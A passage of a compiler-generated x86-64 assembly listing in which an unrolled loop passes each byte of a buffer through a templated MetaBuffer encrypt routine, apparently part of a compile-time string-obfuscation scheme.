  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	b8 01 00 00 00	 mov	 eax, 1
  003cf	48 6b c0 16	 imul	 rax, rax, 22
  003d3	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003da	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003de	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003e5	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  003ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003f1	88 41 17	 mov	 BYTE PTR [rcx+23], al
  003f4	b8 01 00 00 00	 mov	 eax, 1
  003f9	48 6b c0 17	 imul	 rax, rax, 23
  003fd	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00404	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00408	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0040f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00414	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0041b	88 41 18	 mov	 BYTE PTR [rcx+24], al
  0041e	b8 01 00 00 00	 mov	 eax, 1
  00423	48 6b c0 18	 imul	 rax, rax, 24
  00427	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0042e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00432	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00439	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0043e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00445	88 41 19	 mov	 BYTE PTR [rcx+25], al
  00448	b8 01 00 00 00	 mov	 eax, 1
  0044d	48 6b c0 19	 imul	 rax, rax, 25
  00451	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00458	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0045c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00463	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00468	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0046f	88 41 1a	 mov	 BYTE PTR [rcx+26], al
  00472	b8 01 00 00 00	 mov	 eax, 1
  00477	48 6b c0 1a	 imul	 rax, rax, 26
  0047b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00482	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00486	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0048d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00492	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00499	88 41 1b	 mov	 BYTE PTR [rcx+27], al
  0049c	b8 01 00 00 00	 mov	 eax, 1
  004a1	48 6b c0 1b	 imul	 rax, rax, 27
  004a5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004ac	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004b0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004b7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  004bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004c3	88 41 1c	 mov	 BYTE PTR [rcx+28], al
  004c6	b8 01 00 00 00	 mov	 eax, 1
  004cb	48 6b c0 1c	 imul	 rax, rax, 28
  004cf	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  004d6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  004da	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004e1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  004e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  004ed	88 41 1d	 mov	 BYTE PTR [rcx+29], al
  004f0	b8 01 00 00 00	 mov	 eax, 1
  004f5	48 6b c0 1d	 imul	 rax, rax, 29
  004f9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00500	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00504	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0050b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  00510	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00517	88 41 1e	 mov	 BYTE PTR [rcx+30], al
  0051a	b8 01 00 00 00	 mov	 eax, 1
  0051f	48 6b c0 1e	 imul	 rax, rax, 30
  00523	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0052a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0052e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00535	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0BB@$0BH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@@std@@@@AEBAEE@Z ; MetaBuffer<17,23,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41> >::encrypt
  0053a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
